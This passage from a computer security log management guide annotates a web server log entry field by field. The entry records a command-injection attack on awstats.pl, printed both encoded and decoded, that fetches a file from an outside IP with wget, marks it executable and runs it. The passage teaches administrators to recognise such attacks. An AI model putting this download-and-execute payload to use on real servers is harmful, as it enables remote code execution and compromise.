GUIDE TO COMPUTER SECURITY LOG MANAGEMENT



172.30.128.27 - - [14/Oct/2005:05:41:18 -0500] "GET /awstats/awstats.pl?config
dir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20192%2e168%2e1%2e214%2fnikons%3bchmod%20%2bx%
20nikons%3b%2e%2fnikons;echo%20YYY;echo| HTTP/1.1" 302 494



172.30.128.27
           IP address of the host that initiated the request

-
           Indicates that the information was not available (this server is not configured to put any
           information in the second field)

-
           User ID supplied for HTTP authentication; in this case, no authentication was performed

[14/Oct/2005:05:41:18 -0500]
           Date and time that the Web server completed handling the request

GET
           HTTP method

/awstats/awstats.pl
           URL in the request

config dir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20192%2e168%2e1%2e214%2fnikons%3bchmod
%20%2bx%20nikons%3b%2e%2fnikons;echo%20YYY;echo|
           Argument for the request. Each % followed by two hexadecimal characters is a hex encoding of
           an ASCII character. For example, hex 20 is equivalent to decimal 32, and ASCII character 32 is
           a space; therefore, %20 is equivalent to a space. The ASCII equivalent of the log entry above is
           shown below. 10
config dir=|echo;echo YYY;cd /tmp;wget 192.168.1.214/nikons;chmod +x nikons;/.nikons;
echo YYY;echo|

HTTP/1.1
           Protocol and protocol version used to make the request

302
           Status code for the response; in the HTTP protocol standards, code 302 corresponds to “found”

494
           Size of the response in bytes

                                        Figure 2-3. Web Server Log Entry Examples



2.1.4      Usefulness of Logs

The categories of logs described in Sections 2.1.1 through 2.1.3 typically contain different types of
information. Accordingly, some logs are generally more likely than others to record information that
would be helpful for different situations, such as detecting attacks, fraud, and inappropriate usage. For

10
      This log entry shows malicious activity. The attack is attempting to transfer a file called “nikons” from the host at IP
      address 192.168.1.214 to the Web server, set the file to be executable, then run it, most likely with the privileges of the Web
      server.


                                                                 2-6
